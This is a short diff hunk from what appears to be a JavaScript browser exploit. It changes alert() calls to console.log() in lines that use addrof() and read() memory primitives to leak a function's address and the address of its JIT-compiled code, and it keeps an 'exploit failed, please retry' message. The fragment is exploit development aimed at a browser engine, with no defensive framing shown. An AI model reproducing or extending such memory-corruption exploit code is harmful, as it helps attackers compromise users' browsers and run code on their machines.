@@ -131,11 +131,11 @@ function write(addr, val1, val2) {
 }
 
 var funcAddr = addrof(func);
-alert("func address: " + funcAddr.toString(16));
+console.log("func address: " + funcAddr.toString(16));
 var code = read(funcAddr + 0x10)[0];
 
 var jitAddr = read(code + 0x8);
-alert("jit code address: " + jitAddr[0].toString(16), jitAddr[1].toString(16));
+console.log("jit code address: " + jitAddr[0].toString(16), jitAddr[1].toString(16));
 if (funcAddr == 0x7ff80000) {
   alert("exploit failed, please retry");
 }
